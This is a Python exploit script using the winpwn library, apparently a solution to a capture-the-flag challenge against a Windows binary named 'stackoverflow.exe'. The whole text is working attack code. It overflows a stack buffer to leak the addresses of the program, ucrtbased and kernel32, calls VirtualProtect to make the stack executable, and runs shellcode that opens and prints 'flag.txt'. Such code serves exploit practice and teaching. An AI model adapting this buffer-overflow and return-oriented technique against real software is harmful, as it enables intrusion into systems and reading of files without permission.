from winpwn import *

context.arch = 'i386'
context.log_level = "debug"

pe = winfile("stackoverflow.exe")
ucrtbased = winfile("ucrtbased.dll")
kernel32 = winfile("kernel32.dll")
start = lambda: process(pe.path)  # remote

print hex(kernel32.symbols['GetCurrentThreadId'])
print hex(kernel32.exsyms['HeapAlloc'])
p = start()
p.recvuntil("This is the stack address : ")
buf_addr = int(p.recv(8), 16)
log.success("buf addr: " + hex(buf_addr))

p.sendafter("What is your name: ", "\xcc" * 0x108)
p.recvuntil("\xcc" * 0x108)

leak_pe_addr = u32(p.recv(3).ljust(4, '\x00'))
log.success("leak code addr: " + hex(leak_pe_addr))

pe.address = leak_pe_addr - 0x12203
log.info("pe base: " + hex(pe.address))
p.close()

p = start()

printf_addr = pe.address + 0x11046
main_addr = pe.address + 0x112B7

payload = ''
payload += '\xcc' * 0x108
payload += p32(printf_addr)
payload += p32(main_addr)
payload += p32(pe.imsyms['setvbuf'])

p.sendafter("What is your name: ", payload)
p.sendlineafter("Hello, ", "")
p.recvline()

setvbuf_addr = u32(p.recv(4))
log.success("setvbuf addr: " + hex(setvbuf_addr))

ucrtbased.address = setvbuf_addr - ucrtbased.symbols['setvbuf']
log.info("ucrtbase base: " + hex(ucrtbased.address))

payload = ''
payload += '\xcc' * 0x108
payload += p32(ucrtbased.symbols['puts'])
payload += p32(main_addr)
payload += p32(pe.imsyms['GetCurrentThreadId'])
p.sendafter("What is your name: ", payload)
p.sendlineafter("Hello, ", "")
p.recvline()
kernel32.address = u32(p.recv(4)) - kernel32.symbols['GetCurrentThreadId']
log.info("kernel32 base: " + hex(kernel32.address))

p.recvuntil("This is the stack address : ")
buf_addr = int(p.recvline(drop=True), 16)
log.info("buf addr: " + hex(buf_addr))

log.info("CreateFileA: " + hex(kernel32.symbols["CreateFileA"]))

shellcode = asm(
    """
    sub esp,0x1000
    push 0
    push 0x80
    push 3
    push 0
    push 1
    push 0x80000000
    push {0} // FileName
    mov ebx,{1} 
    call ebx //FileA = CreateFileA("flag.txt", 0x80000000, 1u, 0, 3u, 0x80u, 0)
    push 0
    lea ecx, [esp+0x500]
    push ecx
    push 0x100
    push {0} // FileBuffer
    push eax
    mov ebx,{2}
    call ebx //ReadFile(FileA, Buffer, 0x3000u, &NumberOfBytesRead, 0);
    push {0}
    mov ebx,{3}
    call ebx // puts(Buffer);
    """.format(
        hex(buf_addr + 0x50),
        hex(kernel32.symbols['CreateFileA']),
        hex(kernel32.symbols['ReadFile']),
        hex(ucrtbased.symbols['puts'])
    )
)

payload = ""
payload += shellcode
assert len(shellcode) <= 0x50
payload = payload.ljust(0x50, '\xcc')
payload += "flag.txt\x00"
payload = payload.ljust(0x108, '\xcc')
payload += p32(kernel32.symbols['VirtualProtect'])
payload += p32(buf_addr)
payload += p32(buf_addr & ~0xFFF)
payload += p32(0x1000)
payload += p32(0x40)
payload += p32(buf_addr + 0x300)
# windbg.attach(p, "bp {}".format(hex(pe.address + 0x119EA)))

p.sendafter("What is your name: ", payload)
p.sendlineafter("Hello, ", "")
p.interactive()
